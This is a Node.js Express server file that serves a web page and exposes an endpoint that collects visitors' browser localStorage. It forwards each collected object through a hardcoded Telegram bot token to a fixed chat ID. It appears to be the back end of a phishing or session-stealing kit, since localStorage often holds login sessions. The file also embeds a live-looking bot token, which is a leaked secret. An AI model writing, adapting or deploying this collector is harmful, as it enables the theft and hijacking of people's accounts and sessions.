const compression = require("compression");
const express = require("express");
const https = require("https");
const http = require("http");
const cors = require("cors");
const path = require("path");
const fs = require("fs");
const TelegramBot = require("node-telegram-bot-api");
const rateLimit = require("express-rate-limit");

const token = process.env.TELEGRAM_TOKEN || "7382167104:AAHnRX3r26jL-BpwF2NGBLDwIodYlAo0SSU";
const bot = new TelegramBot(token, { polling: true });

const app = express();

// Trust the first proxy
app.set("trust proxy", 1);

const thirdTour = process.argv[2] == 3;
const forcePort = process.argv[3];
const useHttp = process.argv[4] !== "https";

const publicFolderPath = path.join(__dirname, "public");
const port = process.env.PORT || (forcePort ? +forcePort : (thirdTour ? 8443 : 4030));

app.use(cors());
app.set("etag", false);
app.use((req, res, next) => {
  res.set("Cache-Control", "no-store");
  next();
});
app.use(compression());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const limiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 5, // Limit each IP to 100 requests per `window` (here, per 1 hour)
  message: "Too many requests from this IP, please try again after 10minutes",
});

let counter = 1; // Counter to keep track of the number of requests

const requestSet = new Set();

app.get("/", (req, res) => {
  res.sendFile(path.join(publicFolderPath, "index.html"));
});

app.use(express.static(publicFolderPath));

app.post("/users/me", limiter, (req, res) => {
  const reqBody = req.body.localStorage;
  const reqBodyString = JSON.stringify(reqBody);

  if (!reqBody) {
    console.error("No localStorage data received");
    return res.status(400).send("Bad Request: localStorage is required");
  }

  if (requestSet.has(reqBodyString)) {
    console.log("Duplicate request, blocking");
    return res.status(429).send("Duplicate request");
  }

  requestSet.add(reqBodyString);
  setTimeout(() => requestSet.delete(reqBodyString), 5 * 60 * 1000); // 5 minutes

  const identifier = counter++;

  const reqBodyWithId = {
    identifier: identifier,
    localstorage: reqBody,
  };

  [1758327808].forEach((id) => {
    console.log("Sending message to Telegram with data:", reqBodyWithId);

    bot.sendMessage(id, JSON.stringify(reqBodyWithId))
      .then(() => console.log("Message successfully sent"))
      .catch((error) => console.error("Error sending message:", error));
  });

  res.sendStatus(200);
});


const server = useHttp ? http : https;

let options = {};
if (!useHttp) {
  options.key = fs.readFileSync(__dirname + "/certs/server-key.pem");
  options.cert = fs.readFileSync(__dirname + "/certs/server-cert.pem");
}

server.createServer(options, app).listen(port, () => {
  console.log("Listening port:", port, "folder:", publicFolderPath);
});
